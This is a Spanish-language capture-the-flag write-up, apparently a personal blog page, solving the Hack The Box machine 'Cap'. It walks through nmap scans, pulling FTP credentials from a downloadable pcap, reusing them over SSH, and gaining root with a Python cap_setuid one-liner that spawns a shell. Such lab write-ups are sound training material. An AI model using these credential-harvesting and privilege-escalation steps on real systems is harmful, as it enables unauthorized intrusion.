@@ -1,0 +1,644 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>CAP-hackthebox - B0ySie7e</title>
+<meta name="description" content="Maquina CAP, de nivel easy catalogada por la comunidad. Esta maquina va bien para principiantes">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="B0ySie7e">
+<meta property="og:title" content="CAP-hackthebox">
+<meta property="og:url" content="http://localhost:4000/HTB-CAP/">
+
+
+  <meta property="og:description" content="Maquina CAP, de nivel easy catalogada por la comunidad. Esta maquina va bien para principiantes">
+
+
+
+  <meta property="og:image" content="https://i.ibb.co/FhrcyCt/cap.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2021-10-02T00:00:00-04:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/HTB-CAP/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "B0ySie7e",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="B0ySie7e Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/logo.png" alt=""></a>
+                
+        <ul class="visible-links">
+<li class="masthead__menu-item">
+              <a href="/">Home</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/year-archive/">Posts</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/categories/">Categories</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/tags/">Tags</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/about/">About</a>
+            </li>
+</ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1">
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">CAP-hackthebox</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="B0Y-SIE7E" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">B0Y-SIE7E</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Cibersecurity, CTF THB-THM
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Perú</span>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://twitter.com/B0ySie7e" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/B0ySie7e" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="CAP-hackthebox">
+    <meta itemprop="description" content="Maquina CAP, de nivel easy catalogada por la comunidad. Esta maquina va bien para principiantes">
+    <meta itemprop="datePublished" content="October 02, 2021">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">CAP-hackthebox
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2021-10-02T00:00:00-04:00">October 02, 2021 </time> 
+          
+          
+        </p>
+        <h3 id="fase-de-reconocimiento">FASE DE RECONOCIMIENTO</h3>
+<hr>
+<ul>
+  <li>
+    <p>Uno de las principales fases y importantes es la de reconocimiento una vez obtenida la direccion ip de la victima, para ello podemos usar diversas herramientas que permitan el escane de puertos que podemos encontra en internet, en lo personal usare la herramienta nmap.</p>
+
+    <p>Normalmente yo guardo en un archivo “allportsScan.nmap” las evidencias sobre los escaneos para volver a revisar si asi lo requiero en en futuro.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  Sie7e&gt;<span class="nv">$ </span>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-Pn</span> <span class="nt">-vvv</span> &lt;IP&gt; <span class="nt">-oG</span> allportsScan.nmap
+  <span class="c"># Nmap 7.91 scan initiated Sun Aug 15 19:53:22 2021 as: nmap -p- --open --min-rate 5000 -Pn -vvv -oG allportsScan &lt;IP&gt;</span>
+  <span class="c"># Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)</span>
+  Host: cap.htb <span class="o">()</span>   Status: Up
+  Host: cap.htb <span class="o">()</span>   Ports: 21/open/tcp//ftp///, 22/open/tcp//ssh///, 80/open/tcp//http///
+  <span class="c"># Nmap done at Sun Aug 15 19:54:03 2021 -- 1 IP address (1 host up) scanned in 40.61 seconds</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos que  tenemos 3 puertos abiertos
+    <ul>
+      <li>21 que es usado para el servicio <a href="https://blog.infranetworking.com/servidor-ftp/">FTP</a>
+</li>
+      <li>22 que se usa para el servicio de <a href="https://mundo-hackers.weebly.com/servicio-ssh.html">SSH</a>
+</li>
+      <li>80 que se usa para el servicio <a href="https://www.pickaweb.es/ayuda/que-es-http/">web(http)</a>
+</li>
+    </ul>
+  </li>
+  <li>una vez ya conocidos los púertos y los servicios vamos a ver a mas detalle cada servicio y sus caracteristicas.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  Sie7e&gt;<span class="nv">$ </span>nmap <span class="nt">-p21</span>,22,80 <span class="nt">-sC</span> <span class="nt">-sS</span> <span class="nt">-vvv</span> <span class="nt">-oN</span> servicesScan cap.htb
+  <span class="c"># Nmap 7.91 scan initiated Sun Aug 15 19:56:06 2021 as: nmap -p21,22,80 -sC -sS -vvv -oN servicesScan cap.htb</span>
+  Nmap scan report <span class="k">for </span>cap.htb
+  Host is up, received echo-reply ttl 63 <span class="o">(</span>0.35s latency<span class="o">)</span><span class="nb">.</span>
+  Scanned at 2021-08-15 19:56:06 EDT <span class="k">for </span>33s
+
+  PORT   STATE SERVICE REASON
+  21/tcp open  ftp     syn-ack ttl 63
+  22/tcp open  ssh     syn-ack ttl 63
+  | ssh-hostkey: 
+  |   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 <span class="o">(</span>RSA<span class="o">)</span>
+  | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2vrva1a+HtV5SnbxxtZSs+D8/EXPL2wiqOUG2ngq9zaPlF6cuLX3P2QYvGfh5bcAIVjIqNUmmc1eSHVxtbmNEQjyJdjZOP4i2IfX/RZUA18dWTfEWlNaoVDGBsc8zunvFk3nkyaynnXmlH7n3BLb1nRNyxtouW+q7VzhA6YK3ziOD6tXT7MMnDU7CfG1PfMqdU297OVP35BODg1gZawthjxMi5i5R1g3nyODudFoWaHu9GZ3D/dSQbMAxsly98L1Wr6YJ6M6xfqDurgOAl9i6TZ4zx93c/h1MO+mKH7EobPR/ZWrFGLeVFZbB6jYEflCty8W8Dwr7HOdF1gULr+Mj+BcykLlzPoEhD7YqjRBm8SHdicPP1huq+/3tN7Q/IOf68NNJDdeq6QuGKh1CKqloT/+QZzZcJRubxULUg8YLGsYUHd1umySv4cHHEXRl7vcZJst78eBqnYUtN3MweQr4ga1kQP4YZK5qUQCTPPmrKMa9NPh1sjHSdS8IwiH12V0<span class="o">=</span>
+  |   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c <span class="o">(</span>ECDSA<span class="o">)</span>
+  | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDqG/RCH23t5Pr9sw6dCqvySMHEjxwCfMzBDypoNIMIa8iKYAe84s/X7vDbA9T/vtGDYzS+fw8I5MAGpX8deeKI<span class="o">=</span>
+  |   256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 <span class="o">(</span>ED25519<span class="o">)</span>
+  |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPbLTiQl+6W0EOi8vS+sByUiZdBsuz0v/7zITtSuaTFH
+  80/tcp open  http    syn-ack ttl 63
+  | http-methods: 
+  |_  Supported Methods: GET HEAD OPTIONS
+  |_http-title: Security Dashboard
+
+  Read data files from: /usr/bin/../share/nmap
+  <span class="c"># Nmap done at Sun Aug 15 19:56:39 2021 -- 1 IP address (1 host up) scanned in 33.54 seconds</span>
+</code></pre></div></div>
+<ul>
+  <li>
+    <p>En principio no vemos nada raro, ni algo que nos llame la atención.
+vamos a revisar el sitio web:</p>
+
+    <ul>
+      <li>En el sitio web observamos una ruta en la que podemos descargar algunos archivos: http://cap.htb/dat/0</li>
+    </ul>
+  </li>
+</ul>
+
+<center>
+    <a href="https://ibb.co/KWTXfW0"><img src="https://i.ibb.co/YhH31hR/web-cap.png" alt="web-cap" border="0"></a>
+</center>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vemos que podemos descargar archivos ".pcap", estos archivos son paquetes de red en las cuales se capturaron y muchas veces puden capturar informacion como usuarios y contraseñas.
+</code></pre></div></div>
+
+<hr>
+
+<h3 id="wireshark---ftp">WIRESHARK - FTP</h3>
+
+<hr>
+
+<ul>
+  <li>vamos abrir el “0.pcap” con wireshark
+    <center>
+<a href="https://ibb.co/jJWvTvP"><img src="https://i.ibb.co/tLxM4MT/wireshark-cap.png" alt="wireshark-cap" border="0"></a>
+</center>
+
+    <p>Observamos que tenemos las un usuario una contraseña, y el servicio en las cuales se usaron es FTP por lo que vamos a probar a conectarnos por ftp</p>
+    <div class="language-bash highlighter-rouge">
+<div class="highlight"><pre class="highlight"><code>  Sie7e&gt;<span class="nv">$ </span>ftp cap.htb
+  Connected to cap.htb.
+  220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
+  Name <span class="o">(</span>cap.htb:kali<span class="o">)</span>: nathan
+  331 Please specify the password.
+  Password:
+  230 Login successful.
+  Remote system <span class="nb">type </span>is UNIX.
+  Using binary mode to transfer files.
+  ftp&gt; <span class="nb">dir
+  </span>200 PORT <span class="nb">command </span>successful. Consider using PASV.
+  150 Here comes the directory listing.
+  <span class="nt">-r--------</span>    1 1001     1001           33 Oct 04 09:04 user.txt
+  226 Directory send OK.
+</code></pre></div>    </div>
+    <p>Ingresamos con éxito, ahora enuramos un poco y nos encontramos con  un archivo “user.txt” donde veremos la flag. Nos lo descargamos a nuestra equipo.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ftp&gt; get user.txt
+</code></pre></div></div>
+
+<hr>
+
+<h3 id="servicio-ssh---escalar-privilegios">SERVICIO SSH - Escalar privilegios</h3>
+
+<hr>
+
+<ul>
+  <li>¿Ahora? No sabemos por donde ir, pero tenemos credenciales las cuanles podemos probar en el servicio SSH y es posible que se esten reuzando las credenciales.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  Sie7e&gt;<span class="nv">$ </span>ssh nathan@cap.htb
+  nathan@cap.htb<span class="s1">'s password: 
+  Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)
+
+  * Documentation:  https://help.ubuntu.com
+  * Management:     https://landscape.canonical.com
+  * Support:        https://ubuntu.com/advantage
+
+    System information as of Tue Oct  5 04:39:22 UTC 2021
+
+    System load:  0.0               Processes:             226
+    Usage of /:   37.1% of 8.73GB   Users logged in:       0
+    Memory usage: 34%               IPv4 address for eth0: cap.htb
+    Swap usage:   0%
+
+    =&gt; There are 4 zombie processes.
+
+
+  63 updates can be applied immediately.
+  42 of these updates are standard security updates.
+  To see these additional updates run: apt list --upgradable
+
+
+  The list of available updates is more than a week old.
+  To check for new updates run: sudo apt update
+  Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+  Last login: Tue Oct  5 04:38:36 2021 from 10.10.16.4
+  nathan@cap:~$ 
+</span></code></pre></div></div>
+<ul>
+  <li>Una vez ganado acceso a la maquina podemos enumerar para hacernos usuarios privilegiados, enumerando las siguientes cosas:
+    <ul>
+      <li>Archivos o binarios que podemos ejecutar.</li>
+      <li>Tareas que esta programadas en el sistema que se ejecutar cada determinado tiempo.</li>
+      <li>Listar los permisos que tenemos de los archivos /etc/passwd, /etc/shadow.</li>
+      <li>
+        <p>Mas maneras de enumerar el sistema <a href="https://byte-mind.net/enumeracion-y-escalado-de-privilegios-en-linux/">byte-mind.net</a></p>
+      </li>
+      <li>En fin hay una variedad de maneras de enumerar, incluso podemos a recurir a herramientas populares como LinEnum.sh que lo encuentras en github.</li>
+    </ul>
+  </li>
+  <li>En partticular nosotros vamos a enumerar por la <a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities#list-capabilities">capabilities</a>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  nathan@cap:/tmp/tmp.yoA7vt0g1R<span class="nv">$ </span>getcap <span class="nt">-r</span> / 2&gt;/dev/null
+  /usr/bin/python3.8 <span class="o">=</span> cap_setuid,cap_net_bind_service+eip                                            
+  /usr/bin/ping <span class="o">=</span> cap_net_raw+ep                                                                
+  /usr/bin/traceroute6.iputils <span class="o">=</span> cap_net_raw+ep                                                        
+  /usr/bin/mtr-packet <span class="o">=</span> cap_net_raw +ep 
+  /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper <span class="o">=</span> cap_net_bind_service,cap_net_admin+ep   
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos que una de las capabilities es de python3.8. si buscamos en <a href="https://gtfobins.github.io/gtfobins/python/#capabilities">gtfobins.github.io</a> tenemos como migrar al usuario root.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  Capabilities
+  If the binary has the Linux CAP_SETUID capability <span class="nb">set </span>or it is executed by another binary with the capability <span class="nb">set</span>, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.
+
+  <span class="nb">cp</span> <span class="si">$(</span>which python<span class="si">)</span> <span class="nb">.</span>
+  <span class="nb">sudo </span>setcap cap_setuid+ep python
+
+  ./python <span class="nt">-c</span> <span class="s1">'import os; os.setuid(0); os.system("/bin/sh")'</span>
+</code></pre></div></div>
+
+<p>Entonces lo que vamos hacer es seguir la guia(comando)</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  nathan@cap:/tmp/tmp.yoA7vt0g1R<span class="nv">$ </span>python3.8 <span class="nt">-c</span> <span class="s1">'import os; os.setuid(0); os.system("/bin/sh")'</span>
+  <span class="c"># whoami </span>
+  root
+  <span class="c"># </span>
+</code></pre></div></div>
+<ul>
+  <li>Bingo somos usuario root.</li>
+</ul>
+
+<hr>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#cap" class="page__taxonomy-item" rel="tag">cap</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#easy" class="page__taxonomy-item" rel="tag">easy</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#linux" class="page__taxonomy-item" rel="tag">linux</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#write-up" class="page__taxonomy-item" rel="tag">write up</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">hackthebox</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2021-10-02T00:00:00-04:00">October 02, 2021</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/thm-Mustacchio/" class="pagination--pager" title="Mustacchio- Tryhackme
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">© 2021 B0ySie7e</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
